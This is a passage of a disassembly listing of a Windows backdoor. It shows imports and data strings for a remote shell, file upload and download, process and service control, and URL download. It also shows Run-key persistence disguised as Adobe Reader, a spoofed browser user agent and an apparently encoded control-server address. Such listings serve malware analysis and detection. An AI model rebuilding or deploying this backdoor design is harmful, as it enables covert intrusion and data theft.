.rdata:00404414 ; Import names for MSVCRT.dll
.rdata:00404414 ;
.rdata:00404414 off_404414 dd rva word_404970
.rdata:00404418 dd rva word_40497A
.rdata:0040441C dd rva word_404984
.rdata:00404420 dd rva word_404990
.rdata:00404424 dd rva word_4049A6
.rdata:00404428 dd rva word_4049AE
.rdata:0040442C dd rva word_4049BC
.rdata:00404430 dd rva word_4049C4
.rdata:00404434 dd rva word_4049CE
.rdata:00404438 dd rva word_4049DE
.rdata:0040443C dd rva word_4049EA
.rdata:00404440 dd rva word_4049FE
.rdata:00404444 dd rva word_404A0E
.rdata:00404448 dd rva word_404A1E
.rdata:0040444C dd rva word_404A2C
.rdata:00404450 dd rva word_404A3E
.rdata:00404454 dd rva word_4048B8
.rdata:00404458 dd rva word_4048C8
.rdata:0040445C dd rva word_4048D2
.rdata:00404460 dd rva word_4048DC
.rdata:00404464 dd rva word_4048EC
.rdata:00404468 dd rva word_4048F6
.rdata:0040446C dd rva word_404900
.rdata:00404470 dd rva word_404914
.rdata:00404474 dd rva word_40491C
.rdata:00404478 dd rva word_404932
.rdata:0040447C dd rva word_404946
.rdata:00404480 dd rva word_404954
.rdata:00404484 dd rva word_40495C
.rdata:00404488 dd rva word_404966
.rdata:0040448C dd rva word_404928
.rdata:00404490 dd 0
.rdata:00404494 ;
.rdata:00404494 ; Import names for SHELL32.dll
.rdata:00404494 ;
.rdata:00404494 off_404494 dd rva word_404C84
.rdata:00404498 dd rva word_404C74
.rdata:0040449C dd 0
.rdata:004044A0 ;
.rdata:004044A0 ; Import names for Secur32.dll
.rdata:004044A0 ;
.rdata:004044A0 off_4044A0 dd rva word_404CA8
.rdata:004044A4 dd 0
.rdata:004044A8 ;
.rdata:004044A8 ; Import names for USER32.dll
.rdata:004044A8 ;
.rdata:004044A8 off_4044A8 dd rva word_40489A
.rdata:004044AC dd rva word_404886
.rdata:004044B0 dd rva word_404874
.rdata:004044B4 dd rva word_404866
.rdata:004044B8 dd rva word_404852
.rdata:004044BC dd rva word_40483E
.rdata:004044C0 dd 0
.rdata:004044C4 ;
.rdata:004044C4 ; Import names for USERENV.dll
.rdata:004044C4 ;
.rdata:004044C4 off_4044C4 dd rva word_404B2A
.rdata:004044C8 dd 0
.rdata:004044CC ;
.rdata:004044CC ; Import names for WININET.dll
.rdata:004044CC ;
.rdata:004044CC off_4044CC dd rva word_404A8E
.rdata:004044D0 dd rva word_404AA4
.rdata:004044D4 dd rva word_404AB4
.rdata:004044D8 dd rva word_404A7A
.rdata:004044DC dd rva word_404A66
.rdata:004044E0 dd rva word_404A4C
.rdata:004044E4 dd rva word_404ACC
.rdata:004044E8 dd rva word_404AE0
.rdata:004044EC dd rva word_404AF4
.rdata:004044F0 dd rva word_404B0A
.rdata:004044F4 dd 0
.rdata:004044F8 ;
.rdata:004044F8 ; Import names for urlmon.dll
.rdata:004044F8 ;
.rdata:004044F8 off_4044F8 dd rva word_404C52
.rdata:004044FC dd 0
.rdata:00404500 word_404500 dw 171h
.rdata:00404502 db 'GetLastError',0
.rdata:0040450F align 10h
.rdata:00404510 word_404510 dw 34h
.rdata:00404512 db 'CloseHandle',0
.rdata:0040451E word_40451E dw 390h
.rdata:00404520 db 'WaitForSingleObject',0
.rdata:00404534 word_404534 dw 35Eh
.rdata:00404536 db 'TerminateProcess',0
.rdata:00404547 align 4
.rdata:00404548 word_404548 dw 6Fh
.rdata:0040454A db 'CreateThread',0
.rdata:00404557 align 4
.rdata:00404558 word_404558 dw 30Ah
.rdata:0040455A db 'SetCurrentDirectoryA',0
.rdata:0040456F align 10h
.rdata:00404570 word_404570 dw 1F3h
.rdata:00404572 db 'GetWindowsDirectoryA',0
.rdata:00404587 align 4
.rdata:00404588 word_404588 dw 65h
.rdata:0040458A db 'CreatePipe',0
.rdata:00404595 align 2
.rdata:00404596 word_404596 dw 356h
.rdata:00404598 db 'Sleep',0
.rdata:0040459E word_40459E dw 114h
.rdata:004045A0 db 'GetComputerNameA',0
.rdata:004045B1 align 2
.rdata:004045B2 word_4045B2 dw 39Ah
.rdata:004045B4 db 'WriteConsoleInputA',0
.rdata:004045C7 align 4
.rdata:004045C8 word_4045C8 dw 53h
.rdata:004045CA db 'CreateFileA',0
.rdata:004045D6 word_4045D6 dw 0Eh
.rdata:004045D8 db 'AttachConsole',0
.rdata:004045E6 word_4045E6 dw 66h
.rdata:004045E8 db 'CreateProcessA',0
.rdata:004045F7 align 4
.rdata:004045F8 word_4045F8 dw 12Ah
.rdata:004045FA db 'GetConsoleDisplayMode',0
.rdata:00404610 word_404610 dw 2B5h
.rdata:00404612 db 'ReadFile',0
.rdata:0040461B align 4
.rdata:0040461C word_40461C dw 291h
.rdata:0040461E db 'PeekNamedPipe',0
.rdata:0040462C word_40462C dw 15Ah
.rdata:0040462E db 'GetExitCodeProcess',0
.rdata:00404641 align 2
.rdata:00404642 word_404642 dw 286h
.rdata:00404644 db 'OpenProcess',0
.rdata:00404650 word_404650 dw 15Eh
.rdata:00404652 db 'GetFileAttributesA',0
.rdata:00404665 align 2
.rdata:00404666 word_404666 dw 1C1h
.rdata:00404668 db 'GetSystemDirectoryA',0
.rdata:0040467C word_40467C dw 0BCh
.rdata:0040467E db 'ExpandEnvironmentStringsA',0
.rdata:00404698 word_404698 dw 337h
.rdata:0040469A db 'SetStdHandle',0
.rdata:004046A7 align 4
.rdata:004046A8 word_4046A8 dw 1EBh
.rdata:004046AA db 'GetVolumeInformationA',0
.rdata:004046C0 word_4046C0 dw 153h
.rdata:004046C2 db 'GetDriveTypeA',0
.rdata:004046D0 word_4046D0 dw 3BDh
.rdata:004046D2 db 'lstrcatA',0
.rdata:004046DB align 4
.rdata:004046DC word_4046DC dw 178h
.rdata:004046DE db 'GetLogicalDrives',0
.rdata:004046EF align 10h
.rdata:004046F0 word_4046F0 dw 298h
.rdata:004046F2 db 'Process32Next',0
.rdata:00404700 word_404700 dw 296h
.rdata:00404702 db 'Process32First',0
.rdata:00404711 align 2
.rdata:00404712 word_404712 dw 72h
.rdata:00404714 db 'CreateToolhelp32Snapshot',0
.rdata:0040472D align 2
.rdata:0040472E word_40472E dw 3A4h
.rdata:00404730 db 'WriteFile',0
.rdata:0040473A word_40473A dw 163h
.rdata:0040473C db 'GetFileSize',0
.rdata:00404748 word_404748 dw 142h
.rdata:0040474A db 'GetCurrentProcess',0
.rdata:0040475C word_40475C dw 83h
.rdata:0040475E db 'DeleteFileA',0
.rdata:0040476A word_40476A dw 17Dh
.rdata:0040476C db 'GetModuleFileNameA',0
.rdata:0040477F align 10h
.rdata:00404780 word_404780 dw 173h
.rdata:00404782 db 'GetLocalTime',0
.rdata:0040478F align 10h
.rdata:00404790 word_404790 dw 1E9h
.rdata:00404792 db 'GetVersionExA',0
.rdata:004047A0 word_4047A0 dw 60h
.rdata:004047A2 db 'CreateMutexA',0
.rdata:004047AF align 10h
.rdata:004047B0 word_4047B0 dw 31Fh
.rdata:004047B2 db 'SetFileTime',0
.rdata:004047BE word_4047BE dw 35Bh
.rdata:004047C0 db 'SystemTimeToFileTime',0
.rdata:004047D5 align 2
.rdata:004047D6 word_4047D6 dw 1C8h
.rdata:004047D8 db 'GetSystemTime',0
.rdata:004047E6 word_4047E6 dw 43h
.rdata:004047E8 db 'CopyFileA',0
.rdata:004047F2 word_4047F2 dw 3CCh
.rdata:004047F4 db 'lstrlenA',0
.rdata:004047FD align 2
.rdata:004047FE word_4047FE dw 1D3h
.rdata:00404800 db 'GetTempFileNameA',0
.rdata:00404811 align 2
.rdata:00404812 word_404812 dw 1D5h
.rdata:00404814 db 'GetTempPathA',0
.rdata:00404821 align 2
.rdata:00404822 word_404822 dw 0B9h
.rdata:00404824 db 'ExitProcess',0
.rdata:00404830 aKernel32Dll db 'KERNEL32.dll',0
.rdata:0040483D align 2
.rdata:0040483E word_40483E dw 0A1h
.rdata:00404840 db 'DispatchMessageA',0
.rdata:00404851 align 2
.rdata:00404852 word_404852 dw 2AAh
.rdata:00404854 db 'TranslateMessage',0
.rdata:00404865 align 2
.rdata:00404866 word_404866 dw 13Ah
.rdata:00404868 db 'GetMessageA',0
.rdata:00404874 word_404874 dw 60h
.rdata:00404876 db 'CreateWindowExA',0
.rdata:00404886 word_404886 dw 217h
.rdata:00404888 db 'RegisterClassExA',0
.rdata:00404899 align 2
.rdata:0040489A word_40489A dw 8Eh
.rdata:0040489C db 'DefWindowProcA',0
.rdata:004048AB align 4
.rdata:004048AC aUser32Dll db 'USER32.dll',0
.rdata:004048B7 align 4
.rdata:004048B8 word_4048B8 dw 10h
.rdata:004048BA db '??3@YAXPAX@Z',0
.rdata:004048C7 align 4
.rdata:004048C8 word_4048C8 dw 2BEh
.rdata:004048CA db 'strlen',0
.rdata:004048D1 align 2
.rdata:004048D2 word_4048D2 dw 2BAh
.rdata:004048D4 db 'strcpy',0
.rdata:004048DB align 4
.rdata:004048DC word_4048DC dw 0Fh
.rdata:004048DE db '??2@YAPAXI@Z',0
.rdata:004048EB align 4
.rdata:004048EC word_4048EC dw 2B2h
.rdata:004048EE db 'sprintf',0
.rdata:004048F6 word_4048F6 dw 299h
.rdata:004048F8 db 'memset',0
.rdata:004048FF align 10h
.rdata:00404900 word_404900 dw 0CAh
.rdata:00404902 db '_except_handler3',0
.rdata:00404913 align 4
.rdata:00404914 word_404914 dw 23Dh
.rdata:00404916 db 'atoi',0
.rdata:0040491B align 4
.rdata:0040491C word_40491C dw 1BDh
.rdata:0040491E db '_strcmpi',0
.rdata:00404927 align 4
.rdata:00404928 word_404928 dw 2B6h
.rdata:0040492A db 'strcat',0
.rdata:00404931 align 2
.rdata:00404932 word_404932 dw 49h
.rdata:00404934 db '__CxxFrameHandler',0
.rdata:00404946 word_404946 dw 42h
.rdata:00404948 db '_EH_prolog',0
.rdata:00404953 align 4
.rdata:00404954 word_404954 dw 23Eh
.rdata:00404956 db 'atol',0
.rdata:0040495B align 4
.rdata:0040495C word_40495C dw 2B5h
.rdata:0040495E db 'sscanf',0
.rdata:00404965 align 2
.rdata:00404966 word_404966 dw 2C3h
.rdata:00404968 db 'strrchr',0
.rdata:00404970 word_404970 dw 297h
.rdata:00404972 db 'memcpy',0
.rdata:00404979 align 2
.rdata:0040497A word_40497A dw 2C5h
.rdata:0040497C db 'strstr',0
.rdata:00404983 align 4
.rdata:00404984 word_404984 dw 1C5h
.rdata:00404986 db '_strnicmp',0
.rdata:00404990 word_404990 dw 2B7h
.rdata:00404992 db 'strchr',0
.rdata:00404999 align 2
.rdata:0040499A aMsvcrtDll db 'MSVCRT.dll',0
.rdata:004049A5 align 2
.rdata:004049A6 word_4049A6 dw 0D3h
.rdata:004049A8 db '_exit',0
.rdata:004049AE word_4049AE dw 48h
.rdata:004049B0 db '_XcptFilter',0
.rdata:004049BC word_4049BC dw 249h
.rdata:004049BE db 'exit',0
.rdata:004049C3 align 4
.rdata:004049C4 word_4049C4 dw 8Fh
.rdata:004049C6 db '_acmdln',0
.rdata:004049CE word_4049CE dw 58h
.rdata:004049D0 db '__getmainargs',0
.rdata:004049DE word_4049DE dw 10Fh
.rdata:004049E0 db '_initterm',0
.rdata:004049EA word_4049EA dw 83h
.rdata:004049EC db '__setusermatherr',0
.rdata:004049FD align 2
.rdata:004049FE word_4049FE dw 9Dh
.rdata:00404A00 db '_adjust_fdiv',0
.rdata:00404A0D align 2
.rdata:00404A0E word_404A0E dw 6Ah
.rdata:00404A10 db '__p__commode',0
.rdata:00404A1D align 2
.rdata:00404A1E word_404A1E dw 6Fh
.rdata:00404A20 db '__p__fmode',0
.rdata:00404A2B align 4
.rdata:00404A2C word_404A2C dw 81h
.rdata:00404A2E db '__set_app_type',0
.rdata:00404A3D align 2
.rdata:00404A3E word_404A3E dw 0B7h
.rdata:00404A40 db '_controlfp',0
.rdata:00404A4B align 4
.rdata:00404A4C word_404A4C dw 50h
.rdata:00404A4E db 'HttpAddRequestHeadersA',0
.rdata:00404A65 align 2
.rdata:00404A66 word_404A66 dw 55h
.rdata:00404A68 db 'HttpOpenRequestA',0
.rdata:00404A79 align 2
.rdata:00404A7A word_404A7A dw 6Fh
.rdata:00404A7C db 'InternetConnectA',0
.rdata:00404A8D align 2
.rdata:00404A8E word_404A8E dw 0A7h
.rdata:00404A90 db 'InternetSetOptionA',0
.rdata:00404AA3 align 4
.rdata:00404AA4 word_404AA4 dw 92h
.rdata:00404AA6 db 'InternetOpenA',0
.rdata:00404AB4 word_404AB4 dw 98h
.rdata:00404AB6 db 'InternetQueryOptionA',0
.rdata:00404ACB align 4
.rdata:00404ACC word_404ACC dw 59h
.rdata:00404ACE db 'HttpSendRequestA',0
.rdata:00404ADF align 10h
.rdata:00404AE0 word_404AE0 dw 9Ah
.rdata:00404AE2 db 'InternetReadFile',0
.rdata:00404AF3 align 4
.rdata:00404AF4 word_404AF4 dw 69h
.rdata:00404AF6 db 'InternetCloseHandle',0
.rdata:00404B0A word_404B0A dw 93h
.rdata:00404B0C db 'InternetOpenUrlA',0
.rdata:00404B1D align 2
.rdata:00404B1E aWininetDll db 'WININET.dll',0
.rdata:00404B2A word_404B2A dw 1Dh
.rdata:00404B2C db 'GetUserProfileDirectoryA',0
.rdata:00404B45 align 2
.rdata:00404B46 aUserenvDll db 'USERENV.dll',0
.rdata:00404B52 word_404B52 dw 5Fh
.rdata:00404B54 db 'CreateProcessAsUserA',0
.rdata:00404B69 align 2
.rdata:00404B6A word_404B6A dw 1ACh
.rdata:00404B6C db 'OpenProcessToken',0
.rdata:00404B7D align 2
.rdata:00404B7E word_404B7E dw 3Eh
.rdata:00404B80 db 'CloseServiceHandle',0
.rdata:00404B93 align 4
.rdata:00404B94 word_404B94 dw 0D3h
.rdata:00404B96 db 'EnumServicesStatusExA',0
.rdata:00404BAC word_404BAC dw 1ADh
.rdata:00404BAE db 'OpenSCManagerA',0
.rdata:00404BBD align 2
.rdata:00404BBE word_404BBE dw 42h
.rdata:00404BC0 db 'ControlService',0
.rdata:00404BCF align 10h
.rdata:00404BD0 word_404BD0 dw 1AFh
.rdata:00404BD2 db 'OpenServiceA',0
.rdata:00404BDF align 10h
.rdata:00404BE0 word_404BE0 dw 249h
.rdata:00404BE2 db 'StartServiceA',0
.rdata:00404BF0 word_404BF0 dw 124h
.rdata:00404BF2 db 'GetUserNameA',0
.rdata:00404BFF align 10h
.rdata:00404C00 word_404C00 dw 1CBh
.rdata:00404C02 db 'RegCloseKey',0
.rdata:00404C0E word_404C0E dw 204h
.rdata:00404C10 db 'RegSetValueExA',0
.rdata:00404C1F align 10h
.rdata:00404C20 word_404C20 dw 1D1h
.rdata:00404C22 db 'RegCreateKeyExA',0
.rdata:00404C32 word_404C32 dw 1D8h
.rdata:00404C34 db 'RegDeleteValueA',0
.rdata:00404C44 aAdvapi32Dll db 'ADVAPI32.dll',0
.rdata:00404C51 align 2
.rdata:00404C52 word_404C52 dw 4Ah
.rdata:00404C54 db 'URLDownloadToFileA',0
.rdata:00404C67 align 4
.rdata:00404C68 aUrlmonDll db 'urlmon.dll',0
.rdata:00404C73 align 4
.rdata:00404C74 word_404C74 dw 107h
.rdata:00404C76 db 'ShellExecuteA',0
.rdata:00404C84 word_404C84 dw 85h
.rdata:00404C86 db 'SHCreateDirectoryExA',0
.rdata:00404C9B align 4
.rdata:00404C9C aShell32Dll db 'SHELL32.dll',0
.rdata:00404CA8 word_404CA8 dw 18h
.rdata:00404CAA db 'GetUserNameExA',0
.rdata:00404CB9 align 2
.rdata:00404CBA aSecur32Dll db 'Secur32.dll',0
.rdata:00404CC6 word_404CC6 dw 17Fh
.rdata:00404CC8 db 'GetModuleHandleA',0
.rdata:00404CD9 align 2
.rdata:00404CDA word_404CDA dw 1B7h
.rdata:00404CDC db 'GetStartupInfoA',0
.rdata:00404CEC align 400h
.rdata:00404CEC _rdata ends
.rdata:00404CEC
.data:00405000 ; Section 3. (virtual address 00005000)
.data:00405000 ; Virtual size                  : 00000938 (   2360.)
.data:00405000 ; Section size in file          : 00000A00 (   2560.)
.data:00405000 ; Offset to raw data for section: 00003E00
.data:00405000 ; Flags C0000040: Data Readable Writable
.data:00405000 ; Alignment     : default
.data:00405000
.data:00405000 ; Segment type: Pure data
.data:00405000 ; Segment permissions: Read/Write
.data:00405000 _data segment para public 'DATA' use32
.data:00405000 assume cs:_data
.data:00405000 ;org 405000h
.data:00405000 unk_405000 db    0
.data:00405001 db    0
.data:00405002 db    0
.data:00405003 db    0
.data:00405004 unk_405004 db    0
.data:00405005 db    0
.data:00405006 db    0
.data:00405007 db    0
.data:00405008 unk_405008 db    0
.data:00405009 db    0
.data:0040500A db    0
.data:0040500B db    0
.data:0040500C unk_40500C db    0
.data:0040500D db    0
.data:0040500E db    0
.data:0040500F db    0
.data:00405010 ; CHAR szVerb[4]
.data:00405010 szVerb db 'GET',0
.data:00405014 ; char Format[]
.data:00405014 Format db 'Content-Length: %d',0Dh,0Ah,0
.data:00405029 align 4
.data:0040502C ; char aShell[]
.data:0040502C aShell db 'shell',0
.data:00405032 align 4
.data:00405034 aList db 'list',0
.data:00405039 align 4
.data:0040503C aKill db 'kill',0
.data:00405041 align 4
.data:00405044 aGetf db 'getf',0
.data:00405049 align 4
.data:0040504C aPutf_0 db 'putf',0
.data:00405051 align 4
.data:00405054 aStart db 'start',0
.data:0040505A align 4
.data:0040505C aWhoami db 'whoami',0
.data:00405063 align 4
.data:00405064 aQuit db 'quit',0
.data:00405069 align 4
.data:0040506C aPidrun db 'pidrun',0
.data:00405073 align 4
.data:00405074 aGeturl db 'geturl',0
.data:0040507B align 4
.data:0040507C ; char aSleepTime[]
.data:0040507C aSleepTime db 'Sleep Time:',0
.data:00405088 ; char aStartShellFirs[]
.data:00405088 aStartShellFirs db 'Start shell first.',0Dh,0Ah,0
.data:0040509D align 10h
.data:004050A0 ; char asc_4050A0[]
.data:004050A0 asc_4050A0 db 0Dh,0Ah,0
.data:004050A3 align 4
.data:004050A4 ; char Str1[]
.data:004050A4 Str1 db '<h1>Bad Request (Invalid Hostname)<'
.data:004050A4 db '/h1>',0
.data:004050CC ; char asc_4050CC[]
.data:004050CC asc_4050CC db '$',0
.data:004050CE align 10h
.data:004050D0 ; char aSConnected[]
.data:004050D0 aSConnected db 0Dh,0Ah
.data:004050D0 db '%s Connected!',0Dh,0Ah,0
.data:004050E2 align 4
.data:004050E4 ; char aTasks[]
.data:004050E4 aTasks db '\tasks',0
.data:004050EB align 4
.data:004050EC ; char aComputer[]
.data:004050EC aComputer db 'Computer:',0
.data:004050F6 align 4
.data:004050F8 ; char Source[]
.data:004050F8 Source db 'Accept:*/*',0Dh,0Ah
.data:004050F8 db 'Pragma:no-cache',0Dh,0Ah
.data:004050F8 db 'Cache-Control:max-age=0',0Dh,0Ah
.data:004050F8 db 'Cache-Control:no-cache',0Dh,0Ah
.data:004050F8 db 'Proxy-Connection:Keep-Alive',0Dh,0Ah
.data:004050F8 db 0
.data:00405164 ; CHAR FileName[]
.data:00405164 FileName db 'CONIN$',0
.data:0040516B align 4
.data:0040516C ; CHAR CommandLine[]
.data:0040516C CommandLine db 'cmd.exe',0
.data:00405174 ; char aProcessCmdExeE[]
.data:00405174 aProcessCmdExeE db 'Process cmd.exe exited!',0Dh,0Ah,0
.data:0040518E align 10h
.data:00405190 ; char aAndThePidIsD[]
.data:00405190 aAndThePidIsD db ' and the PID is %d',0Dh,0Ah,0
.data:004051A5 align 4
.data:004051A8 ; char aStartedAlready[]
.data:004051A8 aStartedAlready db 'Started already,',0
.data:004051B9 align 4
.data:004051BC aShellStartedFa db 'Shell started fail!',0Dh,0Ah,0
.data:004051D2 align 4
.data:004051D4 ; char aShellStartedSu[]
.data:004051D4 aShellStartedSu db 'Shell started successfully!',0Dh,0Ah
.data:004051D4 db 0
.data:004051F2 align 4
.data:004051F4 ; char aOpentFailedWit[]
.data:004051F4 aOpentFailedWit db 'OpenT failed with %d!',0Ah,0
.data:0040520B align 4
.data:0040520C ; char aOpenpFailedWit[]
.data:0040520C aOpenpFailedWit db 'OpenP failed with %d!',0Ah,0
.data:00405223 align 4
.data:00405224 ; char asc_405224[]
.data:00405224 asc_405224 db 0Ah,0
.data:00405226 align 4
.data:00405228 ; char aCmdpath[]
.data:00405228 aCmdpath db 0Ah
.data:00405228 db 'CmdPath=',0
.data:00405232 align 4
.data:00405234 ; char aGetfileattribu[]
.data:00405234 aGetfileattribu db 'GetFileAttributes Error code: %d',0Dh
.data:00405234 db 0Ah,0
.data:00405257 align 4
.data:00405258 ; char aCmdExe_0[]
.data:00405258 aCmdExe_0 db '\cmd.exe',0
.data:00405261 align 4
.data:00405264 ; CHAR Src[]
.data:00405264 Src db '%ComSpec%',0
.data:0040526E align 10h
.data:00405270 ; char aTotallyDVolume[]
.data:00405270 aTotallyDVolume db 0Dh,0Ah
.data:00405270 db 'Totally %d volumes found.',0Dh,0Ah,0
.data:0040528E align 10h
.data:00405290 ; char aUnkown[]
.data:00405290 aUnkown db 'Unkown',9,9,0
.data:00405299 align 4
.data:0040529C aInvalid db 'Invalid',9,9,0
.data:004052A6 align 4
.data:004052A8 aRemoveable db 'Removeable',9,9,0
.data:004052B5 align 4
.data:004052B8 aFixed db 'Fixed',9,9,0
.data:004052C0 aRemote db 'Remote',9,9,0
.data:004052C9 align 4
.data:004052CC aCdRom db 'CD-ROM',9,9,0
.data:004052D5 align 4
.data:004052D8 aRamdisk db 'Ramdisk',9,9,0
.data:004052E2 align 4
.data:004052E4 ; CHAR String2[]
.data:004052E4 String2 db ':\',0
.data:004052E7 align 4
.data:004052E8 ; char aC[]
.data:004052E8 aC db '%c:',9,0
.data:004052ED align 10h
.data:004052F0 ; char aVolumeOnThisCo[]
.data:004052F0 aVolumeOnThisCo db 'Volume on this computer:',0Dh,0Ah
.data:004052F0 db 'Volume',9,'Type',9,9,'Volume Name',0Dh
.data:004052F0 db 0Ah,0
.data:00405325 align 4
.data:00405328 ; char aD[]
.data:00405328 aD db '/d',0
.data:0040532B align 4
.data:0040532C ; char a24sS[]
.data:0040532C a24sS db '%-24s %s',0Dh,0Ah,0
.data:00405337 align 4
.data:00405338 ; char aListServiceFai[]
.data:00405338 aListServiceFai db 'list service failed!',0Dh,0Ah,0
.data:0040534F align 10h
.data:00405350 ; char aS[]
.data:00405350 aS db '/s',0
.data:00405353 align 4
.data:00405354 ; char a26s5d[]
.data:00405354 a26s5d db '%-26s %5d',0Dh,0Ah,0
.data:00405360 aListProcessFai db 'list process failed!',0Dh,0Ah,0
.data:00405377 align 4
.data:00405378 ; char aP[]
.data:00405378 aP db '/p',0
.data:0040537B align 4
.data:0040537C aSyntaxErrorUsa db 'Syntax error!',9,'Usage:',9,'list <'
.data:0040537C db '/p|/s|/d>',0Dh,0Ah,0
.data:004053A3 align 4
.data:004053A4 ; char aControlservice[]
.data:004053A4 aControlservice db 0Dh,0Ah
.data:004053A4 db 'ControlService failed!',0Dh,0Ah,0
.data:004053BF align 10h
.data:004053C0 aServiceDoesnTS db 0Dh,0Ah
.data:004053C0 db 'Service doesn',27h,'t start!',0Dh,0Ah
.data:004053C0 db 0
.data:004053DB align 4
.data:004053DC aServiceStopped db 0Dh,0Ah
.data:004053DC db 'Service stopped!',0Dh,0Ah,0
.data:004053F1 align 4
.data:004053F4 aServiceStopPen db 0Dh,0Ah
.data:004053F4 db 'Service stop pending!',0Dh,0Ah,0
.data:0040540E align 10h
.data:00405410 aServiceStillRu db 0Dh,0Ah
.data:00405410 db 'Service still running!',0Dh,0Ah,0
.data:0040542B align 4
.data:0040542C ; char aOpenserviceFai[]
.data:0040542C aOpenserviceFai db 0Dh,0Ah
.data:0040542C db 'OpenService failed!',0Dh,0Ah,0
.data:00405444 aServiceDoesNot db 0Dh,0Ah
.data:00405444 db 'Service does not exist!',0Dh,0Ah,0
.data:00405460 ; char aOpenscmanagerF[]
.data:00405460 aOpenscmanagerF db 0Dh,0Ah
.data:00405460 db 'OpenSCManager failed!',0Dh,0Ah,0
.data:0040547A align 4
.data:0040547C aFailed db 0Dh,0Ah
.data:0040547C db 'Failed!',0Dh,0Ah,0
.data:00405488 ; char aOk[]
.data:00405488 aOk db 0Dh,0Ah
.data:00405488 db 'OK!',0Dh,0Ah,0
.data:00405490 aSyntaxErrorUsa_0 db 0Dh,0Ah
.data:00405490 db 'Syntax error!',9,'Usage:',9,'kill <'
.data:00405490 db '/p|/s> <pid|ServiceName>',0Dh,0Ah,0
.data:004054C8 ; char aS_1[]
.data:004054C8 aS_1 db '%*[^/]%*[/]%*[^/]%s',0
.data:004054DC ; char aFilesizeD[]
.data:004054DC aFilesizeD db 'FileSize:',9,'%d',0
.data:004054E9 align 4
.data:004054EC ; char aPutf[]
.data:004054EC aPutf db 'putf',0
.data:004054F1 align 4
.data:004054F4 ; char aSyntaxErrorUsa_3[]
.data:004054F4 aSyntaxErrorUsa_3 db 'Syntax error!',9,'Usage:',9,'getf/p'
.data:004054F4 db 'utf FileName <N>',0Dh,0Ah,0
.data:00405522 align 4
.data:00405524 ; char aMozilla50[]
.data:00405524 aMozilla50 db 'Mozilla/5.0',0
.data:00405530 ; char aSoLong[]
.data:00405530 aSoLong db 'So long!',0Dh,0Ah,0
.data:0040553B align 4
.data:0040553C ; char aOk_1[]
.data:0040553C aOk_1 db 'OK!',0Dh,0Ah,0
.data:00405542 align 4
.data:00405544 ; char aExit[]
.data:00405544 aExit db 'exit',0Dh,0Ah,0
.data:0040554B align 4
.data:0040554C ; char aShellStartedWa[]
.data:0040554C aShellStartedWa db 'Shell started,wait to terminate it.'
.data:0040554C db '....',0Dh,0Ah,0
.data:00405576 align 4
.data:00405578 aServiceIsRunni db 0Dh,0Ah
.data:00405578 db 'Service is running already!',0Dh,0Ah
.data:00405578 db 0
.data:00405598 aServiceStarted db 0Dh,0Ah
.data:00405598 db 'Service started!',0Dh,0Ah,0
.data:004055AD align 10h
.data:004055B0 ; char aStartserviceFa[]
.data:004055B0 aStartserviceFa db 0Dh,0Ah
.data:004055B0 db 'StartService failed!',0Dh,0Ah,0
.data:004055C9 align 4
.data:004055CC ; char aCreateprocessF[]
.data:004055CC aCreateprocessF db 0Dh,0Ah
.data:004055CC db 'CreateProcess failed!',0Dh,0Ah,0
.data:004055E6 align 4
.data:004055E8 aProgramStarted db 0Dh,0Ah
.data:004055E8 db 'Program started!',0Dh,0Ah,0
.data:004055FD align 10h
.data:00405600 aSyntaxErrorUsa_1 db 'Syntax error!',9,'Usage:',9,'start '
.data:00405600 db '</p|/s> <filename|ServiceName>',0Dh
.data:00405600 db 0Ah,0
.data:0040563C ; char aSyntaxError[]
.data:0040563C aSyntaxError db 'Syntax error!',0Ah,0
.data:0040564B align 4
.data:0040564C ; char aSyntaxErrorUsa_2[]
.data:0040564C aSyntaxErrorUsa_2 db 0Dh,0Ah
.data:0040564C db 'Syntax error!',9,'Usage:',9,'GetUrl'
.data:0040564C db ' URL FileName',0Dh,0Ah,0
.data:00405679 align 4
.data:0040567C ; char aCreateFailedWi[]
.data:0040567C aCreateFailedWi db 'Create failed with %d!',0Ah,0
.data:00405694 ; char aOk_0[]
.data:00405694 aOk_0 db 'OK!',0Ah,0
.data:00405699 align 4
.data:0040569C ; char aS_0[]
.data:0040569C aS_0 db '"%s"',0
.data:004056A1 align 4
.data:004056A4 ; char aFailedWithD[]
.data:004056A4 aFailedWithD db 'Failed with %d!',0Ah,0
.data:004056B5 align 4
.data:004056B8 dword_4056B8 dd 1Dh
.data:004056BC ; CHAR ClassName[]
.data:004056BC ClassName db 'MainWndClass',0
.data:004056C9 align 4
.data:004056CC ; char aApplicationDat[]
.data:004056CC aApplicationDat db '\Application Data\Adobe\Reader 9.0\'
.data:004056CC db 'Esl\reader_sl.exe',0
.data:00405701 align 4
.data:00405704 ; char aMozilla40Compa[]
.data:00405704 aMozilla40Compa db 'Mozilla/4.0 (compatible; MSIE 8.0; '
.data:00405704 db 'Windows NT %d.%d; %s;Trident/4.0) %'
.data:00405704 db '02d:%02d ',0
.data:00405754 ; char aNull[]
.data:00405754 aNull db 'null',0
.data:00405759 align 4
.data:0040575C ; CHAR Name[]
.data:0040575C Name db 'GLOBAL\MSFT64',0
.data:0040576A align 4
.data:0040576C ; CHAR ValueName[]
.data:0040576C ValueName db 'Adobe Reader Speed Launcher',0
.data:00405788 ; CHAR SubKey[]
.data:00405788 SubKey db 'Software\Microsoft\Windows\CurrentV'
.data:00405788 db 'ersion\Run',0
.data:004057B6 align 4
.data:004057B8 ; char aDeeatUeiUUdUeA[]
.data:004057B8 aDeeatUeiUUdUeA db 'Ðèèàt^^ÜÊîæ\ÚæÜÐÞÚÊ\ÞäÎ^àêÄØÒÆ\ÐèÚØ'
.data:004057B8 db 0
.data:004057DC db    0
.data:004057DD db    0
.data:004057DE db    0
.data:004057DF db    0
.data:004057E0 db    0
.data:004057E1 db    0
.data:004057E2 db    0
.data:004057E3 db    0
.data:004057E4 db    0
.data:004057E5 db    0
.data:004057E6 db    0
.data:004057E7 db    0
.data:004057E8 db    0
.data:004057E9 db    0
.data:004057EA db    0
.data:004057EB db    0
.data:004057EC db    0
.data:004057ED db    0
.data:004057EE db    0
.data:004057EF db    0
.data:004057F0 db    0
.data:004057F1 db    0
.data:004057F2 db    0
.data:004057F3 db    0
.data:004057F4 db    0
.data:004057F5 db    0
.data:004057F6 db    0
.data:004057F7 db    0
.data:004057F8 db    0
.data:004057F9 db    0
.data:004057FA db    0
.data:004057FB db    0
.data:004057FC db    0
.data:004057FD db    0
.data:004057FE db    0
.data:004057FF db    0
.data:00405800 db    0
.data:00405801 db    0
.data:00405802 db    0
.data:00405803 db    0
.data:00405804 db    0
.data:00405805 db    0
.data:00405806 db    0
.data:00405807 db    0
.data:00405808 db    0
.data:00405809 db    0
.data:0040580A db    0
